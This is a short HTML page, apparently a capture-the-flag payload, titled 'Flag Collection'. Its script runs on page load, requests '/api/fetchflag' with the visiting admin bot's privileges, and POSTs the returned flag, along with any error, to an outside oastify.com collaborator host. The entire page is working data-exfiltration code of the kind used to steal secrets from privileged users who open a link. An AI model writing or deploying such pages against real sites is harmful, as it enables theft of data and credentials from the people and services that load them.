<!DOCTYPE html>
<html>
<head><title>Flag Collection</title></head>
<body>
<h1>Loading...</h1>
<script>
fetch('/api/fetchflag')
  .then(res => res.json())
  .then(data => {
    // Send flag to your webhook
    fetch('https://tgd32f50v4idjvz1rls8qvw8ezkq8iw7.oastify.com', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        flag: data.flag,
        timestamp: new Date().toISOString(),
        source: 'admin_bot'
      })
    });
  })
  .catch(error => {
    // Send error to webhook too
    fetch('https://tgd32f50v4idjvz1rls8qvw8ezkq8iw7.oastify.com', {
      method: 'POST',
      body: JSON.stringify({error: error.message})
    });
  });
</script>
</body>
</html>
